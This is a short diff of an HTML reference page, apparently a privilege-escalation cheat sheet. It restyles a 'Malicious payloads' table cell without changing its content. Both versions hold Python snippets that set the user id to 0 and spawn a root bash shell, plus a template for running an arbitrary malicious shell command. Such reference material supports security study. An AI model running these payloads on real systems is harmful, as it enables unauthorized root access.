@@ -811,20 +811,12 @@ layout: default
         <tr>
             <td>Malicious payloads</td>
             <td>
-                <table>
-                    <tr>
-                        <td>
-                            <li>Spawn root shell</li>
-                            <pre>import os&#13;&#10;import pty&#13;&#10;&#13;&#10;os.setuid(0)&#13;&#10;pty.spawn(&quot;bash&quot;)</pre>
-                        </td>
-                    </tr>
-                    <tr>
-                        <td>
-                            <li>Execute malicious bash command</li>
-                            <pre>import os&#13;&#10;&#13;&#10;os.system(&quot;&lt;malicious bash command&gt;&quot;);</pre>
-                        </td>
-                    </tr>
-                </table>
+                
+                <li>Spawn root shell</li>
+                <pre>import os&#13;&#10;import pty&#13;&#10;&#13;&#10;os.setuid(0)&#13;&#10;pty.spawn(&quot;bash&quot;)</pre>
+                <li>Execute malicious bash command</li>
+                <pre>import os&#13;&#10;&#13;&#10;os.system(&quot;&lt;malicious bash command&gt;&quot;);</pre>
+                
             </td>
         </tr>
     </table>
